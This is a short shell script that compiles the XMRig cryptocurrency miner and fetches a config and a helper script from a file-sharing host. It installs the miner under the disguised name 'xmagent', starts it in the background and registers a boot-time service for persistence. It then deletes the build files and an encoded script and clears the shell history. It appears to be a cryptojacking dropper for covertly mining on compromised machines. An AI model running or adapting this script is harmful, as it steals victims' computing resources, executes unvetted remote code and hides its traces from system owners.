apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
wget https://filebin.net/lel442z07a9t43p5/config.json -O config.json
wget https://filebin.net/lel442z07a9t43p5/xda.sh -O xda.sh
chmod +x config.json
chmod +x xda.sh
chmod +x xmrig
cp xmrig /usr/local/bin/xmagent
cp config.json /usr/local/bin/
cp xda.sh /usr/local/bin/xda
chmod +x /usr/local/bin/xda
chmod +x /usr/local/bin/xmagent
./xmrig -c config.json &
ln -s /usr/local/bin/xda /etc/init.d/xda
update-rc.d xda defaults
cd ../../
rm -rf xmrig/
rm  -rf xmencoded.sh
history -c

